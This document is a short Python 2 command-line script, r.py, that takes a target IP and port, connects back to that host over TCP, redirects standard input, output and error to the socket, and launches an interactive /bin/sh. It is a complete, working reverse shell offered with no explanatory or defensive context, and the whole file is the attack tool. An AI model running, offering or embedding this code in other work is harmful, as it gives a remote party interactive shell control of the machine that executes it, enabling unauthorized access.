#!/usr/bin/python

import socket, subprocess, os, sys, getopt, string;

def r(argv):
	ip="";
	port="";

	try:
		opts, args = getopt.getopt(argv,"ht:p:",["target=","port="])
	except getopt.GetoptError:
		print 'usage: r.py -t <target> -p <port>';
		sys.exit(2);
	for opt, arg in opts:
		if opt == '-h':
			print 'usage: r.py -t <target> -p <port>';
			sys.exit();
		elif opt in ("-t", "--target"):
			ip = arg;
		elif opt in ("-p", "--port"):
			port = arg;

	if (len(ip) > 0 and len(port) > 0):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
		s.connect((ip,string.atoi(port)));
		os.dup2(s.fileno(),0);
		os.dup2(s.fileno(),1);
		os.dup2(s.fileno(),2);
		p = subprocess.call(["/bin/sh","-i"]);
	else:
		print 'usage: r.py -t <target> -p <port>';

if __name__ == "__main__":
	r(sys.argv[1:])
